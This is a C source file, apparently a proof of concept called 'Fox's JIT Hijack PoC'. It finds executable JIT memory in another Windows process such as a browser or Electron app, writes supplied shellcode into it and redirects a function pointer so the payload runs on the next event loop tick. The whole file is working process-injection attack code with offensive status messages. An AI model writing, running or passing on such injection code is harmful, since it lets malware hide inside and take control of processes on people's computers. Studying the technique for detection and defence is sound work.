#include <windows.h>
#include <stdio.h>

// Fox's JIT Hijack PoC
BOOL InjectIntoJIT(HANDLE hProcess, PVOID pShellcode, SIZE_t shellcodeSize, PVOID pTargetFunctionPointer) {
    MEMORY_BASIC_INFORMATION mbi;
    PBYTE pAddress = 0;
    PVOID pJitCave = NULL;

    printf("[+] Scanning for JIT executable regions...\n");

    // 1. Hunt for dynamic executable memory (JIT buffers)
    while (VirtualQueryEx(hProcess, pAddress, &mbi, sizeof(mbi))) {
        // Look for committed, executable memory that is NOT image-backed (MEM_PRIVATE)
        if (mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE && 
           (mbi.Protect == PAGE_EXECUTE_READWRITE || mbi.Protect == PAGE_EXECUTE_READ)) {
            
            // In a real scenario, you'd scan this region for a suitable code cave 
            // (e.g., consecutive 0xCC or 0x00). For PoC, we just take the base + offset.
            pJitCave = (PBYTE)mbi.BaseAddress + 0x1000; 
            break;
        }
        pAddress = (PBYTE)mbi.BaseAddress + mbi.RegionSize;
    }

    if (!pJitCave) {
        printf("[-] No JIT region found. Is this a browser/Electron app?\n");
        return FALSE;
    }

    printf("[+] Found JIT region at %p. Writing payload...\n", pJitCave);

    // 2. Write shellcode into the JIT region. 
    // If it's RX, we temporarily make it RWX. If it's already RWX (older V8), just write.
    DWORD oldProtect;
    VirtualProtectEx(hProcess, pJitCave, shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    WriteProcessMemory(hProcess, pJitCave, pShellcode, shellcodeSize, NULL);
    VirtualProtectEx(hProcess, pJitCave, shellcodeSize, oldProtect, &oldProtect);

    // 3. Data-Only Execution Trigger
    // Overwrite a known function pointer (e.g., a JS timer callback or vtable entry)
    // with the address of our injected JIT cave.
    printf("[+] Hijacking data pointer at %p to point to our JIT cave...\n", pTargetFunctionPointer);
    WriteProcessMemory(hProcess, pTargetFunctionPointer, &pJitCave, sizeof(PVOID), NULL);

    printf("[+] Done. Payload will execute naturally on the next event loop tick.\n");
    return TRUE;
}